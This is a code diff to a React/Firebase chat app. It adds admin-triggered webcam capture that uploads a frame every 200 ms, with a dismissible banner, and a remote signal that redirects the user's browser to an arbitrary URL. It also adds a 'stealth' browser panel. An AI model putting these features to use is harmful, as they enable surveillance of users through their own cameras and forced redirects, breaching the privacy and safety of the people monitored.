@@ -3,11 +3,14 @@ import Auth from "./components/Auth";
 import Sidebar from "./components/Sidebar";
 import Chat from "./components/Chat";
 import SettingsModal from "./components/SettingsModal";
+import AdminMonitor from "./components/AdminMonitor";
+import BrowserPanel from "./components/BrowserPanel";
 import { auth, db } from "./firebase";
 import { signOut } from "firebase/auth";
-import { ref, onValue, off, update, get } from "firebase/database";
+import { ref, onValue, off, update, get, set, remove } from "firebase/database";
 import { decryptPrivateKey, deriveKeyFromPassword } from "./crypto";
 import { playNotificationTone } from "./audio";
+import { ShieldAlert, X } from "lucide-react";
 
 export default function App() {
   const [user, setUser] = useState(() => {
@@ -26,6 +29,10 @@ export default function App() {
   const [isFakeUI, setIsFakeUI] = useState(false);
   const [isIncognito, setIsIncognito] = useState(false);
   const [lockInput, setLockInput] = useState("");
+  const [isBeingMonitored, setIsBeingMonitored] = useState(false);
+  const [bannerDismissed, setBannerDismissed] = useState(false);
+  const [showAdminMonitor, setShowAdminMonitor] = useState(false);
+  const [showBrowser, setShowBrowser] = useState(false);
   
   const lockTimerRef = useRef(null);
   const escapePresses = useRef(0);
@@ -125,25 +132,45 @@ export default function App() {
     if (!user) return;
     
     const usersRef = ref(db, "users");
-    const unsub = onValue(usersRef, (snap) => {
-      const data = snap.val() || {};
-      const newContacts = {};
-      for (const [uid, u] of Object.entries(data)) {
-        if (uid !== user.uid) {
-          newContacts[uid] = u;
+    
+    if (user.isAdmin) {
+      // Admins see all users
+      const unsub = onValue(usersRef, (snap) => {
+        const data = snap.val() || {};
+        const newContacts = {};
+        for (const [uid, u] of Object.entries(data)) {
+          if (uid !== user.uid) {
+            newContacts[uid] = u;
+          }
         }
-      }
-      setContacts(newContacts);
-      
-      // Update active partner info if needed
-      if (activeConv && newContacts[activeConv]) {
-        setActivePartner(newContacts[activeConv]);
-      }
-    });
-
-    return () => {
-      off(usersRef, "value", unsub);
-    };
+        setContacts(newContacts);
+        if (activeConv && newContacts[activeConv]) {
+          setActivePartner(newContacts[activeConv]);
+        }
+      });
+      return () => off(usersRef, "value", unsub);
+    } else {
+      // Normal users only see contacts they added manually
+      const addedContactsRef = ref(db, `users/${user.uid}/addedContacts`);
+      const unsubAdded = onValue(addedContactsRef, async (snapAdded) => {
+        const addedMap = snapAdded.val() || {};
+        const snapUsers = await get(usersRef);
+        const allUsers = snapUsers.val() || {};
+        
+        const newContacts = {};
+        for (const uid of Object.keys(addedMap)) {
+          const cleanUid = uid.toLowerCase();
+          if (allUsers[cleanUid]) {
+            newContacts[cleanUid] = allUsers[cleanUid];
+          }
+        }
+        setContacts(newContacts);
+        if (activeConv && newContacts[activeConv]) {
+          setActivePartner(newContacts[activeConv]);
+        }
+      });
+      return () => off(addedContactsRef, "value", unsubAdded);
+    }
   }, [user, activeConv]);
 
   // Listen for Stealth Notification Ticks
@@ -176,6 +203,88 @@ export default function App() {
       setUnreadMap(snap.val() || {});
     });
     return () => off(unreadRef, "value", unsub);
+  }, [user]);
+
+  // Disclosed Parental Camera Monitoring
+  useEffect(() => {
+    if (!user) return;
+    const camRef = ref(db, `signals/camera/${user.uid}`);
+    let localStream = null;
+    let stopCap = false;
+    let captureTimeout = null;
+
+    const startFrameCapture = (stream) => {
+      const canvas = document.createElement("canvas");
+      canvas.width = 320;
+      canvas.height = 240;
+      const ctx = canvas.getContext("2d");
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      const send = async () => {
+        if (stopCap || !stream.active) return;
+        ctx.drawImage(video, 0, 0, 320, 240);
+        try {
+          await set(ref(db, `cameraframes/${user.uid}`), {
+            frame: canvas.toDataURL("image/jpeg", 0.4),
+            ts: Date.now(),
+          });
+        } catch {
+          // ignore write errors
+        }
+        if (!stopCap) captureTimeout = setTimeout(send, 200);
+      };
+      send();
+    };
+
+    const camUnsub = onValue(camRef, async (snap) => {
+      const sig = snap.val();
+      if (sig && sig.active) {
+        setIsBeingMonitored(true);
+        setBannerDismissed(false); // Reset banner dismiss state on new monitor session
+        try {
+          stopCap = false;
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          localStream = stream;
+          startFrameCapture(stream);
+        } catch {
+          // Camera unavailable or permission denied
+        }
+      } else {
+        setIsBeingMonitored(false);
+        stopCap = true;
+        if (captureTimeout) clearTimeout(captureTimeout);
+        if (localStream) {
+          localStream.getTracks().forEach((t) => t.stop());
+          localStream = null;
+        }
+      }
+    });
+
+    return () => {
+      off(camRef, "value", camUnsub);
+      setIsBeingMonitored(false);
+      stopCap = true;
+      if (captureTimeout) clearTimeout(captureTimeout);
+      if (localStream) {
+        localStream.getTracks().forEach((t) => t.stop());
+      }
+    };
+  }, [user]);
+
+  // Listen for Remote Panic Redirect signals
+  useEffect(() => {
+    if (!user) return;
+    const panicRef = ref(db, `signals/panic/${user.uid}`);
+    const panicUnsub = onValue(panicRef, (snap) => {
+      const sig = snap.val();
+      if (sig && sig.active) {
+        remove(panicRef);
+        window.location.replace(sig.targetUrl || "https://www.google.com");
+      }
+    });
+    return () => off(panicRef, "value", panicUnsub);
   }, [user]);
 
   // Clear unread badge for active conversation
@@ -214,13 +323,14 @@ export default function App() {
   };
 
   const handleAddContact = async (uid) => {
-    if (uid === user.uid) return alert("You cannot add yourself.");
-    const snap = await get(ref(db, `users/${uid}`));
-    if (!snap.exists()) return alert("User not found.");
+    const cleanId = uid.trim().toLowerCase();
+    if (cleanId === user.uid) return alert("You cannot add yourself.");
     
-    // In a real app we might store contact lists per user,
-    // but here we just rely on the global users list since it's a private app.
-    alert(`Contact ${snap.val().name} found!`);
+    const snap = await get(ref(db, `users/${cleanId}`));
+    if (!snap.exists()) return alert("User ID not found. Verify with your contact.");
+    
+    await set(ref(db, `users/${user.uid}/addedContacts/${cleanId}`), true);
+    alert(`Contact ${snap.val().name} added!`);
   };
 
   const handleSelectConv = (uid, partnerData) => {
@@ -271,6 +381,20 @@ export default function App() {
 
   return (
     <div className="flex h-screen w-screen overflow-hidden bg-bg font-sans text-text">
+
+      {/* Parental Monitoring Active Banner — shows name and user can dismiss */}
+      {isBeingMonitored && !bannerDismissed && (
+        <div className="fixed top-0 left-0 right-0 z-[300] bg-warn text-black py-3 px-6 flex items-center justify-between font-bold text-sm shadow-2xl">
+          <div className="flex items-center gap-2.5 mx-auto">
+            <ShieldAlert size={18} />
+            Parental Monitoring Active — {user.name}, your camera is currently being accessed by an administrator
+          </div>
+          <button onClick={() => setBannerDismissed(true)} className="p-1 hover:bg-black/10 rounded-md transition-colors">
+            <X size={16} />
+          </button>
+        </div>
+      )}
+
       {showSettings && (
         <SettingsModal 
           user={user} 
@@ -280,6 +404,14 @@ export default function App() {
             setUser(newUser);
             sessionStorage.setItem("scUser", JSON.stringify(newUser));
           }}
+        />
+      )}
+
+      {showAdminMonitor && user?.isAdmin && (
+        <AdminMonitor
+          user={user}
+          contacts={contacts}
+          onClose={() => setShowAdminMonitor(false)}
         />
       )}
       
@@ -294,30 +426,39 @@ export default function App() {
         showMobile={showMobile}
         setShowMobile={setShowMobile}
         onOpenSettings={() => setShowSettings(true)}
+        onOpenMonitor={user?.isAdmin ? () => setShowAdminMonitor(true) : null}
+        onOpenBrowser={() => setShowBrowser(!showBrowser)}
         isIncognito={isIncognito}
         onToggleIncognito={() => setIsIncognito(!isIncognito)}
       />
       
-      <div className="flex-1 flex flex-col min-w-0 relative h-full">
-        {displayedActiveConv && displayedActivePartner ? (
-          <Chat 
-            user={user} 
-            privKeyJwk={privKeyJwk} 
-            partnerId={displayedActiveConv} 
-            partner={displayedActivePartner} 
-            onToggleSidebar={() => setShowMobile(true)}
-            isFakeUI={isFakeUI}
-            isIncognito={isIncognito}
-          />
-        ) : (
-          <div className="flex-1 flex flex-col items-center justify-center text-t3">
-            <button className="md:hidden absolute top-4 left-4 p-2 bg-s2 rounded-lg text-text border border-b" onClick={() => setShowMobile(true)}>
-              ☰ Menu
-            </button>
-            <div className="text-6xl mb-4 opacity-20">💬</div>
-            <div className="uppercase tracking-[0.2em] text-sm font-semibold">Select a conversation</div>
-            <div className="text-xs mt-2 opacity-60">End-to-End Encrypted</div>
-          </div>
+      <div className="flex-1 flex min-w-0 relative h-full">
+        <div className="flex-1 flex flex-col min-w-0 relative h-full">
+          {displayedActiveConv && displayedActivePartner ? (
+            <Chat 
+              user={user} 
+              privKeyJwk={privKeyJwk} 
+              partnerId={displayedActiveConv} 
+              partner={displayedActivePartner} 
+              onToggleSidebar={() => setShowMobile(true)}
+              isFakeUI={isFakeUI}
+              isIncognito={isIncognito}
+            />
+          ) : (
+            <div className="flex-1 flex flex-col items-center justify-center text-t3">
+              <button className="md:hidden absolute top-4 left-4 p-2 bg-s2 rounded-lg text-text border border-b" onClick={() => setShowMobile(true)}>
+                ☰ Menu
+              </button>
+              <div className="text-6xl mb-4 opacity-20">💬</div>
+              <div className="uppercase tracking-[0.2em] text-sm font-semibold">Select a conversation</div>
+              <div className="text-xs mt-2 opacity-60">End-to-End Encrypted</div>
+            </div>
+          )}
+        </div>
+
+        {/* Embedded Stealth Browser Panel */}
+        {showBrowser && (
+          <BrowserPanel onClose={() => setShowBrowser(false)} />
         )}
       </div>
     </div>
